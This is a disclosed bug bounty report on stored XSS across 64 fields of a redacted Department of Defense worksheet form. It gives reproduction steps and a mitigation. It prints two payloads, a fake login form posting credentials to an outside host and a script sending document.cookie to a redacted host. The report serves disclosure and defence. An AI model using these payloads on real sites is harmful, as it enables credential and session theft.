# Stored XSS via 64(?) vulnerable fields in ███ leads to credential theft/account takeover

## Report Details
- **Report ID**: 847176
- **URL**: https://hackerone.com/reports/847176
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-11T08:39:44.046Z
- **Disclosed**: 2021-02-10T21:07:10.472Z

## Reporter
- **Username**: un4gi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
A user is able to complete a ████████ worksheets via https://██████████. This form allows a user to store multiple XSS payloads within, which will in turn allow the attacker to run malicious code in context of the legal personnel who view the request.

## Impact
The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Step-by-step Reproduction Instructions

1. Browse to https://█████
████████
2. Click `█████████`. Once on the ██████ page, click `███ and ████████`
██████████
3. Click `Continue`.
██████
4. Fill in your name and click `Submit`. XSS payloads seem to be sanitized properly here from basic tests.
███
5. Any field that accepts text in the rest of the document seems vulnerable to XSS. Complete the form, filling in XSS payloads anywhere you can type. I counted 64 vulnerable fields total.
█████████
7. Click `Finish`. You will see a confirmation that your request was submitting and receive a ticket number.
█████████
8. Click `██████`, or return to the `███████` page and put in your info in the `█████` area to modify the worksheet. The XSS will fire in both locations.
█████████
9. To demonstrate credential theft/account takeover, I used the following (very obvious) payload. There are various ways an attacker could do this and nothing seems to be filtered:

```
<h3>Please login to proceed</h3> <form action=http://██████>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```
█████████
███

An attacker can also redirect the user as soon as the worksheet is opened, but as an unauthenticated user I was unable to test for cookie theft:
`<script>window.location="http://███/?cookie=" + document.cookie</script>`
██████

## Suggested Mitigation/Remediation Actions
Sanitize any fields where user input is reflected and disallow special characters from being submitted in each form field.

## Impact

The attacker can have multiple effects from this vulnerability, to include but not limited to account compromise, keystroke logging, drive-by downloads, and much more.

## Attachments
No attachments
